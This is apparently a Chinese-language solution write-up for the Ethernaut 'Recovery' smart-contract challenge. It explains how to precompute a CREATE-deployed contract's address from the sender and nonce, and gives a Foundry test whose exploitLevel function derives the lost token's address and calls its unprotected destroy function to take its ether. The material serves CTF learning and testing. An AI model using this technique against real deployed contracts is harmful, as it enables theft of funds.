合约的地址可以预计算，对于 `CREATE` 和 `CREATE2` 都是如此。对于 `CREATE`，地址为 `keccak256(rlp([sender, nonce]))`，其中 nonce 为 sender 创建合约数。计算出地址后调用 destroy 即可。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Recovery.sol";
import "src/levels/RecoveryFactory.sol";

contract TestRecovery is BaseTest {
    Recovery private level;

    constructor() public {
        levelFactory = new RecoveryFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Recovery(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        address payable token = address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(level), bytes1(0x01)))))
        );

        assertEq(token.balance, 0.001 ether);
        SimpleToken(token).destroy(player);

        vm.stopPrank();
    }
}
```

